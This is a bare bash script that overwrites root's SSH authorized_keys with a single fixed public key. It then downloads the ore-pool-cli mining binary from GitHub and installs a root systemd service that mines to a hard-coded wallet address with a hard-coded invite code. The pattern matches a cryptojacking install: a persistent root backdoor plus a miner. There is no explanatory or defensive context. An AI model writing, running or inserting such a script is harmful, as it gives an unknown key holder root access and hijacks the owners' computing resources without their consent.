#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

url='https://github.com/ore-pool/ore-pool-cli/releases'

version=`curl -sL $url | grep 'ore-pool/ore-pool-cli/releases/tag' |awk '{print $7}' | xargs |awk '{print $1}' |awk -F '/' '{print $6}'`

DIR="/opt/ore"

mkdir $DIR

wget -O $DIR/ore-pool-cli "${url}/download/${version}/ore-pool-cli-${version}"

chmod +x $DIR/ore-pool-cli

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/ore-pool-cli mine --address 5B5BQprt9jzdxYRvZJpgWCSyeR24zo2MV27oH3GjjvZf --invcode 121DM1
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/runtime.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload